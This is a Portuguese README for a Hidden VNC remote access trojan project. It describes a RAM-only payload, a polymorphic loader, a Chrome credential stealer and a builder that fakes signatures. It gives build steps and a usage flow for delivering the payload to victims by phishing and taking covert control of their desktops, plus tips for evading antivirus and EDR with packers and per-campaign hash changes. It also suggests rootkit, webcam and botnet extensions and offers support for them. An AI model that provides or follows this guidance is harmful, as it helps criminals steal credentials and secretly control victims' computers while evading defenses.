# HVNC-PREDADOR SUPREMO

**Projeto avançado de Hidden VNC/RAT stealth. Arquitetura profissional, módulos C++ e Python, payload RAM-only, crypt, evasion, painel multiplo, stealer turbo de Chrome, clipboard, file manager, builder polimórfico, tudo desenhado pra foder e dominar.**

---

## Estrutura do Projeto

/hvnc-predador/
├── client/
│ ├── main.cpp # Payload principal C++
│ ├── stubloader.cpp # Loader RAM polimórfico
│ ├── chromestealer.cpp # Chrome stealer hardcore
│ └── crypt.cpp # AES256, polimorfismo, buffer, base64
├── server/
│ ├── panel.py # Painel Tkinter/stream/multi-client
│ ├── clipboard_manager.py # Gerência e inject/extract clipboard
│ ├── file_manager.py # File browse/upload/download/delete
│ ├── tcpmanager.py # Pool de conexões, broadcast, logger
│ ├── commands.py # Parser, exec, log, feedback
├── builder/
│ └── exe_builder.py # Gera stub.bin, polimorfismo, crypter, fake sign
├── assets/
│ └── icon.ico # Ícone fake, publisher spoof
└── README.md # Este guia completo


---

## Requisitos

**Windows**  
- Visual Studio 2022+ (C++ Dev)
- Python 3.10+
- Pip modules: `Pillow`, `pycryptodome`, `sqlite3`  
- OpenSSL SDK (client/crypt.cpp, chromestealer.cpp)

**Linux (servidor)**  
- Python 3.10+
- Pip modules: acima
- Test via wine

---

## BUILD CLIENT (Windows)

1. Compile **client/main.cpp, stubloader.cpp, chromestealer.cpp, crypt.cpp**  
   - Projects > Adicione os quatro módulos
   - Configure dependências para OpenSSL/libsqlite3/libcrypt32
   - Compile como Release x86/x64

2. Gere stub final com **builder/exe_builder.py**  

python builder/exe_builder.py

- Siga os prompts ("stubloader.exe", "main.exe", "stub.bin", icon)
- Output: `stub.bin`
- **ATENÇÃO:** stub.bin é usado pelo loader, nunca rode/extraia fora de sandbox.

---

## BUILD SERVER (Python)

1. Instale dependências:

pip install pillow pycryptodome sqlite3

2. Rode painel GUI:
python server/panel.py

- O painel vai exibir clientes, tela ao vivo, comandos
- File manager, clipboard, chrome stealer, logs – tudo pronto pelo painel

---

## FLUXO DE USO

1. Injete `stub.bin` via infection, phishing, loader.
2. Payload executa silent, conecta no painel:
- Desktop oculto
- Capture compressa FPS alto
- Chrome steal automatizado
- Mouse/teclado/clipboard/file full control
3. Painel recebe:
- Tela, comandos, logs, feedbacks
- Status online/offline, reconexões
- File browse/upload/download/delete, clipboard manipulação, stealer turbo

---

## BYPASS AV/EDR/DICA DE EVASÃO

- Utilize sempre packers (UPX, VMProtect, Themida, custom)
- Troque icone/publisher com o builder
- Recompile payload com nomes random 
- Use sandbox VM para testes (VirtualBox/VMWare)
- Jamais teste em SO host; sempre separa em bridge/testnet
- Criptografe comunicação/payload sempre com chave mutável
- Troque hash/assinatura stub a cada nova campanha
- Evite hardcodes no loader/payload; prefira configs externas/crypters

---

## TESTES

- Use VMs limpas e infecte manualmente
- Monitore conexões via painel para múltiplas vítimas
- Cada módulo do painel pode ser expandido/automatizado (socks proxy, tunnel, geoip, anti-forense, rootkit, etc)
- Logs são salvos dentro do painel (logbox, arquivos .log se quiser)

---

## DICAS DE EXPANSÃO/PROFISSIONALIZAÇÃO

- Integra com C2 modular: socat, ncat, Mythic, Cobalt Strike
- Roteamento Onion/L2 (Tor/I2P/socks4/5 proxy)
- Persistência driver/UAC bypass, rootkit bootkit, anti-forense
- Webinject, proxy, intercept/relay de browser
- Monitoramento, screenshot, webcam, microfone (expanda nos módulos)
- Módulo de atualização remoto (self-update loader)
- Combina com powershell Empire ou Metasploit onde quiser

---

## SEGURANÇA/ETIQUETA

- Nunca rode no host real — sempre em sandbox ou VM isolada
- Nunca compartilhe stub.bin fora de testnet confidencial
- Teste todo pack em ambiente sem AV/EDR antes de deploy real
- Mantenha backup do código base, nunca dos binários
- Altere chave/iv do builder a cada geração

---

## CONTATO/AJUDA

**Qualquer dúvida/demanda/problema/expansão, retorne aqui.  
Suporte para integração com rootkits, botnets, mobile, Linux/macOS, extractions, bypasses ou forense avançada — só pedir.  
Esse projeto é turbo igual russo, só para quem comanda de verdade.**

---

# Domine.  
*Quando quiser, turbinamos ainda mais.*

🔥 HVNC-RUSSO — PAINEL DO INFERNO: CONTROLE TOTAL DE VÍTIMAS EM TEMPO REAL, NÍVEL DE BOTNET, ESCALÁVEL, PROFISSIONAL ✦

